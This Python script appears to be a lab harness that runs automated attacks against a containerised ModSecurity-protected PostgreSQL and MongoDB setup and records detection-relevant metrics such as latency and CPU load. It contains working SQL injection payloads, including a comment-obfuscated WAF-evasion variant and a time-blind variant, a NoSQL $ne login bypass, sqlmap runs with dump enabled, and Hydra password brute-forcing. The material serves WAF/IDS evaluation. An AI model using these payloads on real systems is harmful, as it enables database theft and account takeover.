#!/usr/bin/env python3
import argparse
import csv
import json
import os
import re
import subprocess
import threading
import time
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path
from typing import Callable, Dict, List, Optional, Sequence, Tuple
import urllib.parse
import urllib.request
import urllib.error

BASE_EXEC = ["docker", "compose", "exec", "-T", "attack-client"]
MEASURE_SCRIPT_CANDIDATES = [
    "/root/attack-scripts/measure_http_requests.py",
    "/root/attack-scripts/attack-scripts/measure_http_requests.py",
]
RESULTS_DIR = Path("results")
LOGS_DIR = RESULTS_DIR / "logs"
CSV_PATH = RESULTS_DIR / "attack_metrics.csv"
PIN_WORDLIST_PATH = RESULTS_DIR / "pins_4digit_top1000.txt"
PIN_SOURCE_CANDIDATES = [
    Path(
        "/opt/SecLists/Passwords/Common-Credentials/"
        "four-digit-pin-codes-sorted-by-frequency-withcount.csv"
    ),
    Path(
        "/opt/seclists/Passwords/Common-Credentials/"
        "four-digit-pin-codes-sorted-by-frequency-withcount.csv"
    ),
]

HTTP_TARGET_BASE = os.environ.get("ATTACK_HTTP_BASE", "http://modsecurity:8080").rstrip(
    "/"
)


def target_url(path: str) -> str:
    return urllib.parse.urljoin(HTTP_TARGET_BASE + "/", path.lstrip("/"))


@dataclass
class Attack:
    name: str
    tool: str
    target: str
    technique: str
    command: Sequence[str]
    success_parser: Callable[[int, str, str], Tuple[bool, str]]
    cpu_service: str
    latency_args: Optional[Sequence[str]] = None
    latency_run_during: bool = False
    extra_note: Optional[str] = None


def ensure_dirs() -> None:
    RESULTS_DIR.mkdir(exist_ok=True)
    LOGS_DIR.mkdir(exist_ok=True)


def copy_into_attack_client(local_path: Path, container_path: str) -> Tuple[bool, str]:
    container_dir = str(Path(container_path).parent)
    subprocess.run(
        [
            "docker",
            "compose",
            "exec",
            "attack-client",
            "mkdir",
            "-p",
            container_dir,
        ],
        capture_output=True,
        text=True,
        check=False,
    )
    command = [
        "docker",
        "compose",
        "cp",
        str(local_path),
        f"attack-client:{container_path}",
    ]
    result = subprocess.run(
        command,
        capture_output=True,
        text=True,
        check=False,
    )
    if result.returncode != 0:
        return False, result.stderr.strip() or result.stdout.strip()
    return True, ""


def sync_attack_scripts() -> None:
    host_dir = Path(__file__).resolve().parent
    command = [
        "docker",
        "compose",
        "cp",
        f"{host_dir}/.",
        "attack-client:/root/attack-scripts/",
    ]
    result = subprocess.run(command, capture_output=True, text=True, check=False)
    if result.returncode != 0:
        print(f"[警告] 同步攻击脚本失败: {result.stderr.strip()}")


def prepare_pin_wordlist(top_n: int = 1000) -> Tuple[Optional[str], Optional[str]]:
    ensure_dirs()
    if PIN_WORDLIST_PATH.exists():
        ok, err = copy_into_attack_client(
            PIN_WORDLIST_PATH, "/root/attack-scripts/pins_4digit_top1000.txt"
        )
        if ok:
            return "/root/attack-scripts/pins_4digit_top1000.txt", None
        return None, f"复制 PIN 字典失败: {err}"

    for candidate in PIN_SOURCE_CANDIDATES:
        if not candidate.exists():
            continue
        pins: List[str] = []
        with candidate.open("r", encoding="utf-8", errors="ignore") as handle:
            reader = csv.reader(handle)
            for row in reader:
                if not row:
                    continue
                value = row[0].strip()
                if value.isdigit() and len(value) == 4:
                    pins.append(value)
                if len(pins) >= top_n:
                    break
        if not pins:
            continue
        PIN_WORDLIST_PATH.write_text("\n".join(pins) + "\n", encoding="utf-8")
        ok, err = copy_into_attack_client(
            PIN_WORDLIST_PATH, "/root/attack-scripts/pins_4digit_top1000.txt"
        )
        if ok:
            return "/root/attack-scripts/pins_4digit_top1000.txt", None
        return None, f"复制 PIN 字典失败: {err}"
    return None, "未找到 SecLists PIN 字典，请确认 /opt/SecLists 已克隆"


def resolve_measure_script_path() -> Optional[str]:
    for candidate in MEASURE_SCRIPT_CANDIDATES:
        result = subprocess.run(
            [*BASE_EXEC, "test", "-f", candidate],
            capture_output=True,
            text=True,
            check=False,
        )
        if result.returncode == 0:
            return candidate
    return None


def resolve_container_name(service: str) -> str:
    result = subprocess.run(
        ["docker", "compose", "ps", "-q", service],
        capture_output=True,
        text=True,
        check=False,
    )
    if result.returncode == 0 and result.stdout.strip():
        return result.stdout.strip().splitlines()[0]
    return service


def _parse_memory_value(value: str) -> Optional[float]:
    match = re.match(r"\s*([0-9]*\.?[0-9]+)\s*([KMGTP]?i?B)\s*", value)
    if not match:
        return None
    number = float(match.group(1))
    unit = match.group(2).lower()
    factor_map = {
        "b": 1,
        "kib": 1024,
        "mib": 1024**2,
        "gib": 1024**3,
        "tib": 1024**4,
        "kb": 1000,
        "mb": 1000**2,
        "gb": 1000**3,
        "tb": 1000**4,
    }
    factor = factor_map.get(unit)
    if factor is None:
        return None
    return number * factor


def _sample_cpu_percent_ps(service: str) -> Optional[float]:
    try:
        result = subprocess.run(
            [
                "docker",
                "compose",
                "exec",
                "-T",
                service,
                "ps",
                "-eo",
                "pcpu=",
            ],
            capture_output=True,
            text=True,
            check=False,
        )
    except FileNotFoundError:
        return None

    if result.returncode != 0 or not result.stdout.strip():
        return None

    total = 0.0
    for line in result.stdout.splitlines():
        value = line.strip()
        if not value:
            continue
        try:
            total += float(value)
        except ValueError:
            continue
    return total


def _sample_container_memory_percent(container: str) -> Optional[float]:
    try:
        result = subprocess.run(
            [
                "docker",
                "stats",
                container,
                "--no-stream",
                "--format",
                "{{.MemUsage}}|{{.MemPerc}}",
            ],
            capture_output=True,
            text=True,
            check=False,
        )
    except FileNotFoundError:
        return None

    if result.returncode != 0 or not result.stdout.strip():
        return None

    sample_line = result.stdout.strip().splitlines()[0]
    mem_usage_part, mem_percent_part = (
        part.strip() for part in sample_line.split("|", 1)
    )
    mem_percent_value = mem_percent_part.rstrip("%")
    try:
        return float(mem_percent_value)
    except ValueError:
        mem_bytes = _parse_memory_value(mem_usage_part.split("/", 1)[0])
        mem_limit_part = (
            mem_usage_part.split("/", 1)[1].strip() if "/" in mem_usage_part else ""
        )
        limit_bytes = _parse_memory_value(mem_limit_part)
        if mem_bytes is not None and limit_bytes:
            return (mem_bytes / limit_bytes) * 100
    return None


def monitor_resources(
    service: str,
    container: str,
    stop_event: threading.Event,
    cpu_samples: List[float],
    mem_samples: List[float],
    interval: float = 0.75,
) -> None:
    while not stop_event.is_set():
        cpu_percent = _sample_cpu_percent_ps(service)
        if cpu_percent is not None:
            cpu_samples.append(cpu_percent)

        mem_percent = _sample_container_memory_percent(container)
        if mem_percent is not None:
            mem_samples.append(mem_percent)

        time.sleep(interval)


def parse_sqlmap_success(returncode: int, stdout: str, stderr: str) -> Tuple[bool, str]:
    if returncode != 0:
        return False, f"sqlmap exited with code {returncode}: {stderr.strip()}"
    normalized = stdout.lower()
    if (
        "does not seem to be injectable" in normalized
        or "all test requests failed" in normalized
    ):
        return False, "sqlmap reported target not injectable"
    if "retrieved" in normalized or "dumped" in normalized or "database:" in normalized:
        return True, "sqlmap retrieved data"
    return True, "sqlmap finished without explicit errors"


def parse_hydra_success(returncode: int, stdout: str, stderr: str) -> Tuple[bool, str]:
    if returncode != 0:
        return False, f"hydra exited with code {returncode}: {stderr.strip()}"
    lines = [line for line in stdout.splitlines() if "login:" in line.lower()]
    if lines:
        return True, lines[-1].strip()
    return False, "hydra did not report any credentials"


def run_subprocess(command: Sequence[str]) -> Tuple[int, str, str]:
    completed = subprocess.run(
        command,
        capture_output=True,
        text=True,
        check=False,
    )
    return completed.returncode, completed.stdout, completed.stderr


def run_measurement(command: Sequence[str]) -> Dict[str, Optional[float]]:
    code, out, err = run_subprocess(command)
    if code != 0:
        return {
            "avg_ms": None,
            "raw": out,
            "error": f"Measurement command failed with code {code}: {err.strip()}",
        }
    try:
        payload = json.loads(out.strip().splitlines()[-1])
        return {
            "avg_ms": payload.get("avg_ms"),
            "raw": out,
            "error": None,
        }
    except json.JSONDecodeError as exc:
        return {"avg_ms": None, "raw": out, "error": f"Invalid JSON: {exc}"}


def run_measurement_async(command: Sequence[str]) -> subprocess.Popen:
    return subprocess.Popen(
        command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
    )


def collect_async_measurement(proc: subprocess.Popen) -> Dict[str, Optional[float]]:
    out, err = proc.communicate()
    if proc.returncode != 0:
        return {
            "avg_ms": None,
            "raw": out,
            "error": f"Measurement command failed with code {proc.returncode}: {err.strip()}",
        }
    try:
        payload = json.loads(out.strip().splitlines()[-1])
        return {"avg_ms": payload.get("avg_ms"), "raw": out, "error": None}
    except json.JSONDecodeError as exc:
        return {"avg_ms": None, "raw": out, "error": f"Invalid JSON: {exc}"}


def write_logs(name: str, stdout: str, stderr: str) -> None:
    (LOGS_DIR / f"{name}.stdout.log").write_text(stdout)
    (LOGS_DIR / f"{name}.stderr.log").write_text(stderr)


def append_csv_row(row: Dict[str, object]) -> None:
    file_exists = CSV_PATH.exists()
    with CSV_PATH.open("a", newline="") as handle:
        writer = csv.DictWriter(
            handle,
            fieldnames=[
                "timestamp",
                "tool",
                "target_database",
                "attack_type",
                "success_rate",
                "avg_latency_ms",
                "peak_cpu_percent",
                "peak_mem_percent",
                "notes",
                "stdout_log",
                "stderr_log",
            ],
        )
        if not file_exists:
            writer.writeheader()
        writer.writerow(row)


def run_attack(config: Attack, measure_script_path: Optional[str]) -> Dict[str, object]:
    latency_result: Optional[Dict[str, Optional[float]]] = None
    async_measure_proc: Optional[subprocess.Popen] = None
    latency_error_override: Optional[str] = None

    latency_command: Optional[List[str]] = None
    if config.latency_args:
        if measure_script_path:
            latency_command = [
                *BASE_EXEC,
                "python3",
                measure_script_path,
                *config.latency_args,
            ]
        else:
            latency_error_override = (
                "Measurement script not found in attack-client container"
            )

    stop_event = threading.Event()
    cpu_samples: List[float] = []
    mem_samples: List[float] = []
    container_name = resolve_container_name(config.cpu_service)
    monitor_thread = threading.Thread(
        target=monitor_resources,
        args=(config.cpu_service, container_name, stop_event, cpu_samples, mem_samples),
        daemon=True,
    )

    monitor_thread.start()

    if latency_command and config.latency_run_during:
        async_measure_proc = run_measurement_async(latency_command)
        # slight warm-up to ensure measurement is active
        time.sleep(0.5)

    proc = subprocess.Popen(
        config.command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    stdout, stderr = proc.communicate()

    stop_event.set()
    monitor_thread.join(timeout=2)

    if async_measure_proc is not None:
        latency_result = collect_async_measurement(async_measure_proc)
    elif latency_command is not None:
        latency_result = run_measurement(latency_command)

    success, notes = config.success_parser(proc.returncode, stdout, stderr)
    write_logs(config.name, stdout, stderr)

    peak_cpu = max(cpu_samples) if cpu_samples else None
    peak_mem = max(mem_samples) if mem_samples else None

    return {
        "tool": config.tool,
        "target_database": config.target,
        "attack_type": config.technique,
        "success_rate": 100 if success else 0,
        "avg_latency_ms": (
            None if latency_result is None else latency_result.get("avg_ms")
        ),
        "peak_cpu_percent": peak_cpu,
        "peak_mem_percent": peak_mem,
        "notes": notes,
        "stdout_log": str((LOGS_DIR / f"{config.name}.stdout.log").resolve()),
        "stderr_log": str((LOGS_DIR / f"{config.name}.stderr.log").resolve()),
        "latency_raw": None if latency_result is None else latency_result.get("raw"),
        "latency_error": (
            latency_error_override
            if latency_error_override
            else (None if latency_result is None else latency_result.get("error"))
        ),
    }


def build_attack_plan(pin_wordlist: Optional[str]) -> List[Attack]:
    # 新增: 三类直接 HTTP 注入测试（不依赖 sqlmap），用于 WAF/IDS 探测 TPR/FPR
    # basic: 直接 UNION SELECT
    # obfuscated: 利用注释混淆 S/*x*/E/*x*/L/*x*/E/*x*/C/*x*/T
    # stored procedure: 调用 pg_sleep 作为存储过程/函数调用示例
    sqlmap_union_payload = target_url(
        "pg/users?id=1%20UNION%20ALL%20SELECT%20NULL,current_database(),version()--"
    )
    sqlmap_time_payload = target_url(
        "pg/users?id=1%20AND%209999=(SELECT%209999%20FROM%20PG_SLEEP(1.5))"
    )
    mongo_payload = target_url("mongo/login?username[$ne]=1&password[$ne]=1")
    pg_baseline_payload = target_url("pg/users?id=1")

    brute_force_command: List[str]
    brute_force_notes: Optional[str] = None
    if pin_wordlist:
        brute_force_command = [
            *BASE_EXEC,
            "hydra",
            "-l",
            "shortuser",
            "-P",
            pin_wordlist,
            "postgres-db",
            "postgres",
            "-s",
            "5432",
            "-V",
            "-I",
            "-t",
            "4",
        ]
    else:
        brute_force_command = [
            *BASE_EXEC,
            "hydra",
            "-l",
            "shortuser",
            "-x",
            "4:4:1",
            "postgres-db",
            "postgres",
            "-s",
            "5432",
            "-V",
            "-I",
        ]
        brute_force_notes = "未找到 PIN 字典，回退到纯暴力枚举"

    attacks: List[Attack] = [
        Attack(
            name="http_pg_sqli_basic",
            tool="raw-http",
            target="PostgreSQL",
            technique="基础SQL注入",
            command=[
                *BASE_EXEC,
                "python3",
                "/root/attack-scripts/raw_http_attack.py",
                "--url",
                target_url("pg/users"),
                "--param",
                "id=1 UNION ALL SELECT NULL,current_database(),version()--",
                "--attack-id",
                "BASIC_SQLI",
            ],
            success_parser=lambda c, o, e: (
                c == 0,
                "基础SQL注入请求完成" if c == 0 else e[-160:],
            ),
            cpu_service="postgres-db",
            latency_args=[
                "--url",
                sqlmap_union_payload,
                "--samples",
                "6",
                "--delay",
                "0.25",
            ],
        ),
        Attack(
            name="http_pg_sqli_obfuscated",
            tool="raw-http",
            target="PostgreSQL",
            technique="混淆SQL注入",
            command=[
                *BASE_EXEC,
                "python3",
                "/root/attack-scripts/raw_http_attack.py",
                "--url",
                target_url("pg/users"),
                "--param",
                "id=1/**/UNION/**/ALL/**/SELECT/**/NULL,current_database(),version()--",
                "--attack-id",
                "OBFUSCATED_SQLI",
            ],
            success_parser=lambda c, o, e: (
                c == 0,
                "混淆SQL注入请求完成" if c == 0 else e[-160:],
            ),
            cpu_service="postgres-db",
            latency_args=[
                "--url",
                sqlmap_union_payload,
                "--samples",
                "6",
                "--delay",
                "0.25",
            ],
        ),
        Attack(
            name="http_pg_sqli_storedproc",
            tool="raw-http",
            target="PostgreSQL",
            technique="存储过程调用",
            command=[
                *BASE_EXEC,
                "python3",
                "/root/attack-scripts/raw_http_attack.py",
                "--url",
                target_url("pg/users"),
                "--param",
                "id=1 AND 9999=(SELECT 9999 FROM pg_sleep(0.8))",
                "--attack-id",
                "PROC_SQLI",
            ],
            success_parser=lambda c, o, e: (
                c == 0,
                "存储过程注入请求完成" if c == 0 else e[-160:],
            ),
            cpu_service="postgres-db",
            latency_args=[
                "--url",
                sqlmap_time_payload,
                "--samples",
                "4",
                "--delay",
                "0.6",
            ],
        ),
        Attack(
            name="sqlmap_pg_union",
            tool="sqlmap",
            target="PostgreSQL",
            technique="联合查询注入",
            command=[
                *BASE_EXEC,
                "sqlmap",
                "-u",
                target_url("pg/users?id=1"),
                "-p",
                "id",
                "--dbms=PostgreSQL",
                "--risk=3",
                "--level=5",
                "--technique=U",
                "--batch",
                "--dump",
            ],
            success_parser=parse_sqlmap_success,
            cpu_service="postgres-db",
            latency_args=[
                "--url",
                sqlmap_union_payload,
                "--samples",
                "10",
                "--delay",
                "0.2",
            ],
        ),
        Attack(
            name="sqlmap_pg_timeblind",
            tool="sqlmap",
            target="PostgreSQL",
            technique="时间盲注",
            command=[
                *BASE_EXEC,
                "sqlmap",
                "-u",
                target_url("pg/users?id=1"),
                "-p",
                "id",
                "--dbms=PostgreSQL",
                "--risk=3",
                "--level=5",
                "--technique=T",
                "--time-sec=1.5",
                "--batch",
                "--dump",
            ],
            success_parser=parse_sqlmap_success,
            cpu_service="postgres-db",
            latency_args=[
                "--url",
                sqlmap_time_payload,
                "--samples",
                "5",
                "--delay",
                "0.5",
            ],
        ),
        Attack(
            name="sqlmap_mongo_nosql",
            tool="sqlmap",
            target="MongoDB",
            technique="NoSQL注入",
            command=[
                *BASE_EXEC,
                "sqlmap",
                "-u",
                target_url("mongo/login?username=admin&password=foo"),
                "-p",
                "username",
                "--dbms=MongoDB",
                "--risk=3",
                "--level=5",
                "--batch",
            ],
            success_parser=parse_sqlmap_success,
            cpu_service="mongo-db",
            latency_args=[
                "--url",
                mongo_payload,
                "--samples",
                "10",
                "--delay",
                "0.3",
            ],
        ),
        Attack(
            name="hydra_pg_dictionary",
            tool="Hydra",
            target="PostgreSQL",
            technique="字典攻击",
            command=[
                *BASE_EXEC,
                "hydra",
                "-L",
                "/root/attack-scripts/users.txt",
                "-P",
                "/root/attack-scripts/passwords.txt",
                "postgres-db",
                "postgres",
                "-s",
                "5432",
                "-V",
                "-f",
            ],
            success_parser=parse_hydra_success,
            cpu_service="postgres-db",
            latency_args=[
                "--url",
                pg_baseline_payload,
                "--duration",
                "8",
                "--delay",
                "0.4",
            ],
            latency_run_during=True,
        ),
        Attack(
            name="hydra_pg_bruteforce",
            tool="Hydra",
            target="PostgreSQL",
            technique="暴力破解",
            command=brute_force_command,
            success_parser=parse_hydra_success,
            cpu_service="postgres-db",
            latency_args=[
                "--url",
                pg_baseline_payload,
                "--duration",
                "10",
                "--delay",
                "0.5",
            ],
            latency_run_during=True,
            extra_note=brute_force_notes,
        ),
    ]
    return attacks


def summarize(results: List[Dict[str, object]]) -> None:
    print("\n=== 攻击汇总 ===")
    header = f"{'工具':<10}{'目标数据库':<15}{'攻击类型':<16}{'成功率%':>10}{'平均延迟ms':>14}{'峰值CPU%':>12}{'峰值内存%':>12}"
    print(header)
    print("-" * len(header))
    for item in results:
        avg_latency = (
            f"{item['avg_latency_ms']:.1f}"
            if isinstance(item.get("avg_latency_ms"), (int, float))
            else "-"
        )
        peak_cpu = (
            f"{item['peak_cpu_percent']:.1f}"
            if isinstance(item.get("peak_cpu_percent"), (int, float))
            else "-"
        )
        peak_mem = (
            f"{item['peak_mem_percent']:.1f}"
            if isinstance(item.get("peak_mem_percent"), (int, float))
            else "-"
        )
        print(
            f"{item['tool']:<10}{item['target_database']:<15}{item['attack_type']:<16}"
            f"{item['success_rate']:>10}{avg_latency:>14}{peak_cpu:>12}{peak_mem:>12}"
        )
    print()


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Run automated attacks and collect metrics."
    )
    parser.add_argument(
        "--skip",
        nargs="*",
        help="Optional attack names to skip (e.g., sqlmap_mongo_nosql)",
    )
    parser.add_argument(
        "--pin-top",
        type=int,
        default=1000,
        help="Number of top PINs to extract from SecLists (default: 1000).",
    )
    args = parser.parse_args()

    ensure_dirs()
    sync_attack_scripts()
    pin_wordlist, pin_error = prepare_pin_wordlist(args.pin_top)
    if pin_wordlist:
        print(f"[信息] 已准备 PIN 字典: {pin_wordlist}")
    elif pin_error:
        print(f"[警告] {pin_error}")
    measure_script_path = resolve_measure_script_path()
    if measure_script_path:
        print(f"[信息] 使用延迟测量脚本: {measure_script_path}")
    else:
        print(
            "[警告] 未在 attack-client 容器中找到 measure_http_requests.py，延迟数据将不会被记录。"
        )
    results: List[Dict[str, object]] = []

    for attack in build_attack_plan(pin_wordlist):
        if args.skip and attack.name in args.skip:
            print(f"跳过 {attack.name}")
            continue
        print(f"\n>>> 执行 {attack.name} ({attack.tool} / {attack.technique})")
        result = run_attack(attack, measure_script_path)
        result_row = {
            "timestamp": datetime.utcnow().isoformat(),
            "tool": result["tool"],
            "target_database": result["target_database"],
            "attack_type": result["attack_type"],
            "success_rate": result["success_rate"],
            "avg_latency_ms": result["avg_latency_ms"],
            "peak_cpu_percent": result["peak_cpu_percent"],
            "peak_mem_percent": result["peak_mem_percent"],
            "notes": result["notes"],
            "stdout_log": result["stdout_log"],
            "stderr_log": result["stderr_log"],
        }
        append_csv_row(result_row)

        if result.get("latency_error"):
            print(f"[警告] 延迟采样失败: {result['latency_error']}")
        elif result.get("avg_latency_ms") is not None:
            print(f"[信息] 平均延迟 {result['avg_latency_ms']:.1f} ms")

        if result.get("peak_cpu_percent") is not None:
            print(f"[信息] 峰值 CPU {result['peak_cpu_percent']:.1f}%")
        else:
            print("[警告] 未能收集 CPU 数据。请确认 docker CLI 可用。")

        if result.get("peak_mem_percent") is not None:
            print(f"[信息] 峰值内存 {result['peak_mem_percent']:.1f}%")
        else:
            print("[警告] 未能收集内存数据。请确认 docker CLI 可用。")

        note_text = result["notes"]
        if attack.extra_note:
            note_text = f"{note_text} ({attack.extra_note})"
        print(f"[结果] {note_text}")
        results.append(result)

    summarize(results)


if __name__ == "__main__":
    main()
